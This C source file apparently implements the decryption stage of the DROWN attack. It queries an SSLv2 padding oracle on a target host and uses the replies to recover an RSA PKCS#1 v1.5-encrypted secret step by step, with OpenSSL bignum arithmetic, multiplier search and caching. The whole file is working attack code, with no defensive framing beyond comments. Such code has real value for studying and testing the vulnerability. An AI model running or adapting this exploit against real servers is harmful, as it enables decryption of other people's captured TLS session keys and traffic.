#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include "decrypt.h"
#include "oracle.h"


void BN_dump(BIGNUM *bn)
{
    printf("%s\n", BN_bn2hex(bn));
}


void oracle_guess(drown_ctx *dctx, BIGNUM *c, BIGNUM *k, int bsize)
{
    int bytesize = bsize/8-1;
    unsigned char result[24];
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    run_oracle_guess(dctx->hostport, bytesize, enc_key, 256, result);

    // Convert m to bignum
    BN_bin2bn(result, bytesize, k);
}

/*
    Checks whether c is valid for any length of padding we know.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid_multiple(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    int size = run_oracle_valid_multiple(dctx->hostport, enc_key, 256);
    if(size == 0)
        return 0;
    else
        return (size + 1) * 8;
}

/*
    Checks whether c is correctly padded to 24 bytes.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    if(run_oracle_valid(dctx->hostport, 24, enc_key, 256))
        return 25*8;
    return 0;
}


int mycheck(unsigned long s, BIGNUM *cl_1e, drown_ctx* dctx, int *l, BIGNUM *ss)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *e = dctx->e;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);

    BIGNUM * upperbits = BN_CTX_get(ctx);
    int res = 0;

    BN_rshift(upperbits, mt, 2032);
    if(BN_is_word(upperbits, 0x0002))
    {
        // cc = c * (s / l) ** e = ((c / l) ** e) * (c ** e)
        BN_set_word(ss, s);
        BN_mod_exp(c, ss, e, n, ctx);
        BN_mod_mul(c, cl_1e, c, n, ctx);

        *l = oracle_valid(dctx, c);
        //printf("Valid %d\n", *l);
        res = 1;
    }

    BN_CTX_end(ctx);

    return res;
}


#define MAX_CACHE_SIZE 5

/*
    Finds a multiplier s, so that c_2 = c_1 * (s * l_1) ** e is valid.

    for each s
        c_2 = c_1 * (s * l_1) ** e
        if oracle(c_2)
            return s
    end

    for each s
        mt_2 = mt_1 * s * l_1
        if 2*B <= mt_2 < 3*B
            c_2 = c_1 * (s * l_1) ** e
            if oracle(c_2)
                return s
        end
    end

    Updates c, s, mt, l, ?
*/
int find_multiplier(drown_ctx *dctx, BIGNUM *l_1, BIGNUM * ss)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *e = dctx->e;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *inc = BN_CTX_get(ctx);
    BIGNUM *cl_1e = BN_CTX_get(ctx);
    BIGNUM * mttmp = BN_CTX_get(ctx);

    // Precompute c * (l_1 ** e)
    BN_mod_exp(cl_1e, l_1, e, n, ctx);
    BN_mod_mul(cl_1e, c, cl_1e, n, ctx);

    int l = 0;

    // We will try every value of s, so we will add instead of multiplying
    // Compute our increment
    BN_mod_mul(inc, mt, l_1, n, ctx);
    unsigned long s = 1;
    BN_copy(mt, inc);

    // We will cache some values of delta_s and delta_mt
    unsigned long cache_s[MAX_CACHE_SIZE];
    BIGNUM * cache_mt[MAX_CACHE_SIZE];
    int cache_size = 0;
    unsigned long last_s;
    BIGNUM *last_mt = BN_CTX_get(ctx);


    // First, we try to find a multiplier s so that 2 * B <= s * mt * l_1 < 3 * B
    while(!mycheck(s, cl_1e, dctx, &l, ss))
    {
        BN_mod_add(mt, mt, inc, n, ctx);
        s++;
    }

    // Loop while we don't have a result
    while(!l)
    {
        // Remember the values of s and mt to compute delta_s and delta_mt
        last_s = s;
        BN_copy(last_mt, mt);

        // We try to find a s so that 2 * B <= s * mt * l_1 < 3 * B
        do
        {
            BN_mod_add(mt, mt, inc, n, ctx);
            s++;
        } while(!mycheck(s, cl_1e, dctx, &l, ss));

        // If the cache is not full, add delta_s and delta_mt to the cache
        if(cache_size < MAX_CACHE_SIZE)
        {
            cache_s[cache_size] = s - last_s;
            cache_mt[cache_size] = BN_CTX_get(ctx);
            BN_mod_sub(cache_mt[cache_size], mt, last_mt, n, ctx);
            cache_size++;
        }

        int res = 1;
        // We use cached search until either :
        // * we find a result
        // * no cached values works
        while(res && !l)
        {
            res = 0;
            BN_copy(mttmp, mt);
            for(int i = 0; i < cache_size; i++)
            {
                BN_mod_add(mt, mttmp, cache_mt[i], n, ctx);
                res = mycheck(s + cache_s[i], cl_1e, dctx, &l, ss);
                if(res)
                {
                    s += cache_s[i];
                    break;
                }
            }
            if(!res)
                BN_copy(mt, mttmp);
        }
    }

    BN_set_word(ss, s);

    BN_CTX_end(ctx);

    return l;
}

/*
    We have c0 = m0 ** e (mod n)
            m0 = PKCS_1_v1.5_pad(k)), with |k| = ksize
    Given c0, e, n, ksize and an oracle, we try to find m0 (and succeed !)
*/
void decrypt(drown_ctx *dctx)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *S = dctx->s;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *l_1 = BN_CTX_get(ctx);
    BIGNUM *ss = BN_CTX_get(ctx);
    BIGNUM *r = BN_CTX_get(ctx);

    // mt is our current approximation of m
    // u marks the highest known bit
    // l marks the lowest unknown bit

    // At the beginning, we have
    //         u                              l
    // m  = 0002???????????????????????????????00gggggggg
    // where g is the bits of m0 (found by the oracle)


    int l = oracle_valid_multiple(dctx, c);
    oracle_guess(dctx, c, mt, l);
    int u = 2032;
    BN_set_bit(mt, 2033);



    // Repeat while we don't know all the bits
    while(u > l)
    {
        // We know l low bits, so we know that for the next mt, we will know approximately l more upper bits
        u -= l;

        // Compute l_1 = 2**(-l)
        BN_lshift(l_1, BN_value_one(), l);
        BN_mod_inverse(l_1, l_1, n, ctx);

        // Find a multiplier
        l = find_multiplier(dctx, l_1, ss);

        // Remember our multiplier
        BN_mod_mul(S, S, ss, n, ctx);
        BN_mod_mul(S, S, l_1, n, ctx);

        // We learnt approximately l bits.
        // However, we're multiplying by s so we're not sure of |s| + 1 bits
        u += BN_num_bits(ss) + 1;
        // Another gotcha : we must remove 01*, because they may change by addition
        while(BN_is_bit_set(mt, u))
            u++;
        u++;
        // Be sure that u and l won't collide
        if(u < l)
            u = l;
        // Great ! We know u, so we can clear the low bits
        BN_rshift(mt, mt, u);
        BN_lshift(mt, mt, u);

        // Guess the low bits
        oracle_guess(dctx, c, r, l);
        BN_add(mt, mt, r);

        BN_print_fp(stderr, mt);
        fprintf(stderr, "\n");

    }

    BN_CTX_end(ctx);
}


